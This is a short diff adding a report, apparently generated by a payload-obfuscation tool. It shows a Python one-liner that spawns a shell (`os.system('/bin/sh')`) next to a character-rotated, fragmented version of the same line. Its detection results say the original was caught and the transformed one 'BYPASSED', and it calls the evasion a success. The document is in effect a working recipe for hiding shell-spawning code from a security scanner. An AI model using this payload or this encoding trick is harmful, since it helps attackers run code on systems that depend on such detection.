@@ -1,0 +1,11 @@
+=== Cloak Report ===
+Timestamp: 2026-02-04T14:55:09.560528
+
+Original Payload: import os; os.system('/bin/sh')
+Original SHA256: 4b2e1e3ab250ccbb7ac9ef58bba380eef04cf1b824a4242cfdddfed2975cfaea
+Transformed Payload Preview: vz+cb+eg+ b+f;+ b+f.+fl+fg+rz+('+/o+va+/f+u'+)
+Transformed SHA256: 1cd7c9399b4a92798742530cd4be1abe82566589270bac27b3bb79b313ef9496
+
+Original Detection: DETECTED
+Transformed Detection: BYPASSED
+Effectiveness: SUCCESS — Transformation bypassed detection.
